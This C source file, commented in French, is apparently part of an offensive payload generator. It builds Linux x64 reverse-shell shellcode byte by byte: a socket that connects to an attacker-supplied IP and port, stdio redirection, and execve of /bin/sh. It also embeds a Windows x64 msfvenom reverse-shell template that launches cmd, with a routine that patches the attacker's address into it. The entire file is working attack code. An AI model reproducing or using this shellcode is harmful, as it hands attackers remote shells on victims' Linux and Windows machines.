#include "../include/payload_generator.h"
#include <string.h>
#include <arpa/inet.h>

/**
 * Génère un shellcode reverse shell Linux x64 dynamiquement
 * @param lhost: IP du listener (attaquant) en format "192.168.0.28"
 * @param lport: Port du listener (1-65535)
 * @param shellcode: Buffer de sortie (doit être au moins 128 bytes)
 * @return: Taille du shellcode généré, ou -1 en cas d'erreur
 */
int generate_shellcode(const char *lhost, int lport, unsigned char *shellcode) {
    unsigned char ip_bytes[4];
    unsigned char port_hi, port_lo;
    int i;
    
    // Parser l'IP
    if (sscanf(lhost, "%hhu.%hhu.%hhu.%hhu", 
               &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Valider le port
    if (lport < 1 || lport > 65535) {
        return -1;
    }
    
    // Extraire les bytes du port (network byte order)
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    // Template du shellcode reverse shell Linux x64
    // Structure:
    // 1. socket(AF_INET, SOCK_STREAM, 0) - 16 bytes
    // 2. connect(sockfd, &sockaddr, 16) - 24 bytes (avec IP et port)
    // 3. dup2(sockfd, 0/1/2) - 10 bytes
    // 4. execve("/bin/sh", ...) - 27 bytes
    
    i = 0;
    
    // ============================================
    // Étape 1 : socket(AF_INET, SOCK_STREAM, 0)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xc0;  // xor rax, rax
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xff;  // xor rdi, rdi
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xd2;  // xor rdx, rdx
    shellcode[i++] = 0x4d; shellcode[i++] = 0x31; shellcode[i++] = 0xc0;  // xor r10, r10
    shellcode[i++] = 0x6a; shellcode[i++] = 0x02;  // push 2
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x01;  // push 1
    shellcode[i++] = 0x5e;  // pop rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x06;  // push 6
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x6a; shellcode[i++] = 0x29;  // push 41 (sys_socket)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    shellcode[i++] = 0x49; shellcode[i++] = 0x89; shellcode[i++] = 0xc0;  // mov r10, rax
    
    // ============================================
    // Étape 2 : connect(sockfd, &sockaddr, 16)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x4d; shellcode[i++] = 0x31; shellcode[i++] = 0xd2;  // xor rdx, rdx
    shellcode[i++] = 0x41; shellcode[i++] = 0x52;  // push r10 (padding)
    shellcode[i++] = 0xc6; shellcode[i++] = 0x04; shellcode[i++] = 0x24; shellcode[i++] = 0x02;  // mov byte [rsp], 2 (AF_INET)
    
    // Port (network byte order) - 2 bytes
    shellcode[i++] = 0x66; shellcode[i++] = 0xc7; shellcode[i++] = 0x44; shellcode[i++] = 0x24; shellcode[i++] = 0x02;  // mov word [rsp+2], ...
    shellcode[i++] = port_hi;  // Port high byte
    shellcode[i++] = port_lo;  // Port low byte
    
    // IP (4 bytes)
    shellcode[i++] = 0xc7; shellcode[i++] = 0x44; shellcode[i++] = 0x24; shellcode[i++] = 0x04;  // mov dword [rsp+4], ...
    shellcode[i++] = ip_bytes[0];  // IP byte 1
    shellcode[i++] = ip_bytes[1];  // IP byte 2
    shellcode[i++] = ip_bytes[2];  // IP byte 3
    shellcode[i++] = ip_bytes[3];  // IP byte 4
    
    shellcode[i++] = 0x48; shellcode[i++] = 0x89; shellcode[i++] = 0xe6;  // mov rsi, rsp
    shellcode[i++] = 0x6a; shellcode[i++] = 0x10;  // push 16
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x41; shellcode[i++] = 0x50;  // push r10
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x2a;  // push 42 (sys_connect)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    
    // ============================================
    // Étape 3 : dup2(sockfd, 0/1/2)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x03;  // push 3
    shellcode[i++] = 0x5e;  // pop rsi
    
    // dup_loop:
    shellcode[i++] = 0x48; shellcode[i++] = 0xff; shellcode[i++] = 0xce;  // dec rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x21;  // push 33 (sys_dup2)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    shellcode[i++] = 0x75; shellcode[i++] = 0xf6;  // jnz dup_loop (relatif -10 bytes)
    
    // ============================================
    // Étape 4 : execve("/bin/sh", ["/bin/sh", NULL], NULL)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xff;  // xor rdi, rdi
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x5e;  // pop rsi
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x48; shellcode[i++] = 0xbf;  // mov rdi, ...
    // "//bin/sh" en little-endian (8 bytes)
    shellcode[i++] = 0x2f; shellcode[i++] = 0x2f;  // "//"
    shellcode[i++] = 0x62; shellcode[i++] = 0x69;  // "bi"
    shellcode[i++] = 0x6e; shellcode[i++] = 0x2f;  // "n/"
    shellcode[i++] = 0x73; shellcode[i++] = 0x68;  // "sh"
    shellcode[i++] = 0x48; shellcode[i++] = 0xc1; shellcode[i++] = 0xef; shellcode[i++] = 0x08;  // shr rdi, 8
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x54;  // push rsp
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x3b;  // push 59 (sys_execve)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    
    return i;  // Retourner la taille du shellcode
}

/**
 * Génère un shellcode reverse shell Windows x64 dynamiquement
 * Utilise une approche simplifiée avec des appels API Windows
 * @param lhost: IP du listener (attaquant) en format "192.168.0.28"
 * @param lport: Port du listener (1-65535)
 * @param shellcode: Buffer de sortie (doit être au moins 512 bytes)
 * @return: Taille du shellcode généré, ou -1 en cas d'erreur
 */
/**
 * Modifie l'IP et le port dans un shellcode Windows msfvenom
 * Cherche le pattern: mov r12, <port><ip> (49 bc 02 00 PP PP II II II II)
 * @param shellcode: Buffer contenant le shellcode Windows
 * @param shellcode_len: Taille du shellcode
 * @param lhost: Nouvelle IP
 * @param lport: Nouveau port
 * @return: 0 si succès, -1 si échec
 */
int modify_windows_shellcode_ip_port(unsigned char *shellcode, int shellcode_len, const char *lhost, int lport) {
    unsigned char ip_bytes[4];
    unsigned short port_network;
    int i;
    
    // Parser l'IP
    if (sscanf(lhost, "%hhu.%hhu.%hhu.%hhu", 
               &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Valider le port
    if (lport < 1 || lport > 65535) {
        return -1;
    }
    
    // Port en network byte order
    port_network = htons((unsigned short)lport);
    
    // Chercher le pattern dans le shellcode msfvenom Windows x64
    // Pattern: 49 bc 02 00 [PORT_HI] [PORT_LO] [IP1] [IP2] [IP3] [IP4]
    // C'est l'instruction: mov r12, <sockaddr_in structure>
    for (i = 0; i < shellcode_len - 9; i++) {
        // Chercher: 49 bc (mov r12, imm64)
        if (shellcode[i] == 0x49 && shellcode[i+1] == 0xbc) {
            // Vérifier que c'est bien le pattern attendu (02 00 = AF_INET)
            if (shellcode[i+2] == 0x02 && shellcode[i+3] == 0x00) {
                // Trouvé ! Modifier le port (bytes 4-5)
                shellcode[i+4] = (port_network >> 8) & 0xFF;
                shellcode[i+5] = port_network & 0xFF;
                
                // Modifier l'IP (bytes 6-9)
                shellcode[i+6] = ip_bytes[0];
                shellcode[i+7] = ip_bytes[1];
                shellcode[i+8] = ip_bytes[2];
                shellcode[i+9] = ip_bytes[3];
                
                return 0;  // Succès
            }
        }
    }
    
    return -1;  // Pattern non trouvé
}

int generate_shellcode_windows(const char *lhost, int lport, unsigned char *shellcode) {
    // Template shellcode Windows x64 msfvenom (460 bytes)
    // Ce shellcode sera modifié avec l'IP et le port
    unsigned char template[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x0a\x14"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    
    int template_len = sizeof(template) - 1;  // -1 pour exclure le \0
    
    // Copier le template
    memcpy(shellcode, template, template_len);
    
    // Modifier l'IP et le port
    if (modify_windows_shellcode_ip_port(shellcode, template_len, lhost, lport) < 0) {
        return -1;
    }
    
    return template_len;
}

